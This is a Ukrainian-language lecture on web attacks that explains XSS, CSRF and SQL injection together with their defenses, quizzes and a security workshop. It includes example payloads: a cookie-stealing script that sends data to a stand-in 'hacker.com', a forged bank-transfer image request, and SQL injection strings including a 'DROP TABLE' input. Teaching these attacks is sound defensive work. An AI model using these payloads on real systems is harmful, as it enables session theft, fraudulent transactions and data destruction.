# Лекція 8: Темна сторона Вебу. XSS, CSRF та SQL Injection

## Експрес-опитування: Чи зламають вас?

1.  Ви дозволили користувачу вводити своє ім'я, і він ввів `<b>Бог</b>`. Тепер його ім'я на сайті жирне. Це проблема?
2.  Ви зберігаєте паролі користувачів у базі даних. Що станеться, якщо хакер вкраде базу?
3.  Ви залогінені в банку. Ви клікнули на посилання в дивному листі, яке перевело вас на шкідливий сайт. Чи можуть з вашого рахунку зникнути гроші?

<details markdown="1">
<summary>Відповіді (Страшна правда)</summary>

1.  **Так, це XSS.** Якщо він зможе зробити текст жирним, він зможе вставити `<script>` і вкрасти cookies всіх, хто зайде на його профіль.
2.  **Залежить від хешування.** Якщо паролі відкритим текстом — кінець. Якщо хешовані (SHA/Argon2) — у хакера буде лише набір символів[^rainbow].
3.  **Так, це CSRF.** Шкідливий сайт, на який ви перейшли, може надіслати фоновий POST-запит (наприклад, через приховану форму) до вашого банку. Браузер автоматично додасть ваші cookies від `bank.com`, і банк виконає переказ. *(Примітка: якщо банк дозволяє переказувати гроші простим GET-запитом по посиланню, це катастрофічно поганий дизайн API, але класичний CSRF атакує саме POST-запити через сторонні сторінки).*

</details>

## 1. XSS (Cross-Site Scripting)

Це коли зловмисник впроваджує свій JavaScript на вашу сторінку.

**Шляхи потрапляння шкідливого коду (Вектори атаки):**
*   **Вразливості вводу/виводу (класичні типи XSS):**
    *   *Stored (збережений XSS):* Шкідливий скрипт зберігається в базі даних (наприклад, у коментарі чи профілі) та відображається кожному відвідувачу сторінки.
    *   *Reflected (відбитий XSS):* Скрипт не зберігається в БД, а приходить у параметрах запиту (наприклад, `?search=<script>...`) і сервер одразу ж виводить його на сторінці пошуку без очищення.
    *   *DOM-based XSS:* Код клієнтського JavaScript небезпечно обробляє дані з URL (наприклад, читає `location.hash`) і вставляє їх у DOM за допомогою `innerHTML`.
*   **Компрометація сторонніх бібліотек (Supply Chain Attack):** Злам залежностей (NPM-пакетів) або підміна скриптів, які завантажуються з публічних CDN.
*   **Атаки посередника (Man-in-the-Middle):** Впровадження коду провайдером чи зловмисником у незахищений HTTP-трафік (вирішується використанням HTTPS).
*   **Шкідливі файли користувачів:** Завантаження SVG-зображень, які містять вбудовані скрипти, або HTML-файлів під виглядом документів.

**Сценарій атаки (Stored XSS):**
1.  Хакер пише в коментарі: `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`.
2.  Сервер зберігає це.
3.  Ви заходите почитати коментарі.
4.  Ваш браузер виконує скрипт.
5.  Ваша сесія летить хакеру.

**Як браузери та розробники захищають нас:**
*   **HttpOnly Cookies:** Прапорець для кук, який повністю забороняє доступ до них через JavaScript (`document.cookie`). Навіть якщо XSS відбудеться, хакер не зможе вкрасти сесійний ідентифікатор.
*   **Subresource Integrity (SRI):** Атрибут `integrity` (криптографічний хеш файлу) для тегів `<script>`. Браузер перевіряє хеш завантаженого файлу з CDN, і якщо його було підмінено хакерами — блокує виконання.
*   **Content Security Policy (CSP):** HTTP-заголовок, який дозволяє браузеру завантажувати скрипти та ресурси лише з довірених доменів і забороняє виконання вбудованого (inline) JS.
*   **Same-Origin Policy (SOP):** Фундаментальне правило безпеки, що не дозволяє скриптам з одного домену (наприклад, `evil.com`) читати або змінювати дані іншого сайту (`bank.com`).
*   **Trusted Types API:** Сучасна функція браузера, яка блокує пряме передавання звичайних рядків у потенційно небезпечні функції на кшталт `innerHTML`, змушуючи розробників використовувати спеціальні безпечні об'єкти.
*   **Escaping & Sanitization:** Перетворення спецсимволів (наприклад, `<` стає `&lt;`) або повне очищення HTML від небезпечних тегів перед рендерингом (автоматично робиться сучасними фреймворками на кшталт React/Vue).

## 2. CSRF (Cross-Site Request Forgery)

Атака "підробленого запиту".

**Вектори атаки (як шкідливий запит може бути надісланий):**
*   **Через GET-запити (найпростіший шлях):** Якщо чутлива дія (наприклад, зміна пароля чи видалення акаунта) виконується простим GET-запитом, зловмиснику достатньо розмістити на своєму сайті звичайне зображення: `<img src="http://bank.com/transfer?amount=100">`. Браузер автоматично спробує завантажити картинку й виконає дію від вашого імені.
*   **Автоматичне відправлення прихованих HTML-форм:** Для POST-запитів зловмисник створює приховану форму на своєму сайті та автоматично відправляється за допомогою JavaScript (`form.submit()`) одразу після завантаження сторінки користувачем.
*   **Крос-доменні асинхронні запити (fetch/XHR):** Спроби надіслати запит з коду сторонньої сторінки (хоча тут діють додаткові обмеження безпеки CORS).

**Сценарій атаки:**
1.  Ви залогінені на сайті `bank.com`.
2.  Хакер створює сайт `free-iphone.com`.
3.  На цьому сайті є прихована форма, яка відправляє POST запит на `bank.com/transfer?to=hacker&amount=1000`.
4.  Коли ви заходите на сайт хакера, форма відправляється.
5.  Браузер додає ваші куки від `bank.com`. Банк думає, що це ви зробили переказ.

**Як браузери та розробники захищають нас:**
*   **SameSite Cookie Attribute:** Головний сучасний захист на рівні браузера. Прапорці `SameSite=Strict` або `SameSite=Lax` (який є стандартом за замовчуванням у сучасних браузерах) вказують браузеру НЕ надсилати куки авторизації разом із крос-доменними (cross-site) запитами.
*   **CSRF Tokens:** Унікальний випадковий ключ, який сервер генерує для кожної сесії чи форми та перевіряє при отриманні запиту. Зловмисник зі свого сайту не може зчитати цей токен через обмеження SOP (Same-Origin Policy), тому його запит буде відхилено.
*   **Перевірка заголовків Origin та Referer:** Сервер може перевірити ці заголовки, які браузер автоматично додає до запитів і які вказують, з якого саме сайту прийшов запит.
*   **Метадані Sec-Fetch-***: Сучасні браузери додають спеціальні заголовки (наприклад, `Sec-Fetch-Site: cross-site`), які дозволяють серверу надійно визначати походження запиту і блокувати сторонні запити до API.

## 3. SQL Injection

Це класика бекенду. Введення SQL-коду замість даних.

**Вектори атаки (як шкідливий SQL-код потрапляє в базу):**
*   **Конкатенація рядків (динамічний SQL):** Коли розробник формує SQL-запит шляхом прямого додавання введених користувачем рядків у шаблон запиту.
*   **Введення через будь-які джерела даних:** Дані можуть надходити не лише з полів форми, а й через параметри URL (наприклад, `?id=5 OR 1=1`), HTTP-заголовки (User-Agent, Cookies, якщо вони логуються у базу), або тіло JSON-запитів до API.

**Код сервера:**
`SELECT * FROM users WHERE name = '` + **userName** + `';`

**Введення хакера:**
`' OR '1'='1`

**Результат запиту:**
`SELECT * FROM users WHERE name = '' OR '1'='1';`
Це поверне **ВСІХ** користувачів, бо `1=1` завжди істина.

**Чи захищають браузери від SQL Injection?**
*   **Ні, браузери не здатні захистити від SQL-ін'єкцій.** База даних розташована на сервері, і браузер не має жодного доступу та контролю над процесом формування чи виконання SQL-запитів.
*   **Валідація на фронтенді — це лише зручність (UX):** Обмеження типу `<input type="number">` чи використання валідаторів у JS полегшують життя звичайним користувачам, але зловмисник може легко надіслати шкідливі дані в обхід браузера (наприклад, через термінальну утиліту `curl` або Postman).

**Захист (виключно на стороні сервера):**
*   **Prepared Statements (параметризовані запити):** Основний захист. Запит та дані передаються в СУБД окремо. База даних спочатку компілює шаблон запиту, а дані підставляє як значення (літерали), тому вони ні за яких умов не інтерпретуються як SQL-команди.
*   **Використання ORM (наприклад, Sequelize, Prisma):** Сучасні інструменти роботи з БД за замовчуванням будують безпечні параметризовані запити під капотом.
*   **Принцип найменших привілеїв (Least Privilege):** Обліковий запис бази даних, який використовує вебдодаток, повинен мати права лише на читання/запис необхідних таблиць, але не на адміністрування бази (наприклад, заборона виконання `DROP TABLE`).

## Практикум та Домашнє завдання

Виконайте **[Воркшоп 8: Аудит та зміцнення безпеки](workshops/ws08_auth_security.md)**.

У межах цього практикуму ви проведете детальну ревізію безпеки ігрового коду та виправте 4 критичні вразливості:
1. **XSS (Cross-Site Scripting):** заміните небезпечний `innerHTML` на безпечний `textContent` для відображення динамічних даних.
2. **Збереження паролів у відкритому вигляді:** реалізуєте безпечне хешування паролів із криптографічною сіллю (Salt) за допомогою Web Crypto API (`crypto.subtle`).
3. **Архітектурні ризики CSRF:** розберете різницю між LocalStorage та Cookies, а також додасте повторне підтвердження пароля (Re-authentication) для чутливих дій.
4. **JS Code Injection:** усунете небезпечне використання функції `eval()` для пошуку користувачів (імітація SQL-ін'єкції).

## Контрольні питання

1. Чим XSS відрізняється від CSRF? Яка атака складніша для захисту?

<details markdown="1">
<summary>Відповідь</summary>

XSS — зловмисник впроваджує скрипт у ваш сайт, і він виконується для жертви. Атака на контент сайту.

CSRF — зловмисник змушує браузер жертви зробити запит до стороннього (авторизованого) сайту від її імені. Атака на дії користувача.

CSRF складніший: захист від XSS (escaping) стандартизований, а CSRF вимагає явних токенів або SameSite Cookie.

</details>

2. Якщо база даних вкрадена і в ній паролі у відкритому вигляді — що трапиться з користувачами? А якщо паролі хешовані без солі?

<details markdown="1">
<summary>Відповідь</summary>

Відкриті паролі — катастрофа: зловмисник одразу отримує доступ до всіх акаунтів, а оскільки люди часто використовують один і той самий пароль на різних сервісах, під загрозою опиняються й інші їхні профілі.

Хешовані без солі — піддаються атаці за допомогою райдужних таблиць (Rainbow Tables). Оскільки однаковий пароль завжди дає однаковий хеш, зловмисник може миттєво знайти оригінальний пароль у заздалегідь обчисленій базі даних.

З унікальною сіллю для кожного користувача — навіть однакові паролі дадуть абсолютно різні хеші. У такому разі зловмиснику доведеться підбирати кожен пароль індивідуально (brute force), що стає занадто дорогим та нереалістичним за часом.

</details>

3. Чому `innerHTML = userInput` небезпечно, а `textContent = userInput` — ні?

<details markdown="1">
<summary>Відповідь</summary>

`innerHTML` парсить рядок як HTML, тому `<script>alert(1)</script>` або `<img src=x onerror=alert(1)>` виконаються як код.

`textContent` вставляє рядок як простий текст — теги стають символами і не виконуються. Використовуйте `textContent` для виводу user-generated контенту.

</details>

4. Поясніть SQL Injection на прикладі. Як від нього захищаються?

<details markdown="1">
<summary>Відповідь</summary>

При склейці рядків: `"SELECT * FROM users WHERE name = '" + name + "'"` — якщо name = `'; DROP TABLE users; --`, запит стає руйнівним.

Захист: Prepared Statements (параметризовані запити). Дані передаються окремо від коду запиту, тому ніколи не інтерпретуються як SQL.

</details>

5. Навіщо потрібна Content Security Policy (CSP)?

<details markdown="1">
<summary>Відповідь</summary>

CSP — HTTP-заголовок, який вказує браузеру, з яких доменів дозволено завантажувати скрипти, стилі, медіа. Навіть якщо зловмисник вставив `<script src="https://evil.com/steal.js">`, CSP заблокує його виконання. Це другий рубіж після escaping.

</details>

[^rainbow]: **Радужні таблиці (Rainbow Tables)** — це заздалегідь обчислені бази даних, які містять хеші для великої кількості можливих паролів. Вони дозволяють зловмисникам швидко відновлювати паролі за їхніми хешами без перебору вручну. Захистом проти таких таблиць є використання випадкової солі (salt) для кожного пароля перед хешуванням.
